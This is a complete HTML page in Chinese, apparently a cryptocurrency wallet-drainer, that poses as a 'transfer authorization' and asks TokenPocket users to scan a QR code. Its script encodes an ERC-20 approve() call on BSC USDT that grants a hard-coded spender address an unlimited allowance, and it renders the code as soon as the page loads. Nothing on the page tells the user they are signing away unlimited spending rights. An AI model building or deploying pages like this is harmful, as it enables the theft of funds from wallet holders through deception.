<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>转账授权</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
#qrcode{
width:280px;height:280px;background:#fff;padding:10px;
border-radius:16px;margin:0 auto 20px;
display:flex;align-items:center;justify-content:center;
color:#000;font-size:14px;
}
#qrcode img{width:100%;height:100%;border-radius:12px}
.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
</style>
</head>
<body>

<div class="container">
  <div class="pay-box">
    <h1>💳 转账授权</h1>
    <p class="desc">请使用 TokenPocket 扫码完成授权</p>
    <div id="qrcode">生成授权二维码中...</div>
    <div class="tip">扫码后将自动唤起钱包签名</div>
  </div>
</div>

<script>
// ====================== 配置 ======================
const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
const SPENDER_ADDR = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 授权目标（你的合约/管理员）
const CHAIN_ID    = "56"; // BSC 主网 (十进制)
// ====================================================

// 生成 EIP-681 授权交易 URL
function generateApproveEIP681() {
  // approve 函数选择器 + 参数编码
  const data = "0x095ea7b3" + 
    SPENDER_ADDR.slice(2).padStart(64, '0') + 
    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  
  // EIP-681 格式: ethereum:tokenAddress@chainId?data=...
  const eipUrl = `ethereum:${TOKEN_ADDR}@${CHAIN_ID}?data=${data}`;
  return eipUrl;
}

// 生成二维码（TP 钱包直接识别为交易请求）
function renderQRCode() {
  const eipUrl = generateApproveEIP681();
  const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(eipUrl)}`;
  document.getElementById("qrcode").innerHTML = `<img src="${qrApi}" alt="授权二维码">`;
}

// 页面加载时直接生成授权二维码
window.onload = renderQRCode;
</script>
</body>
</html>
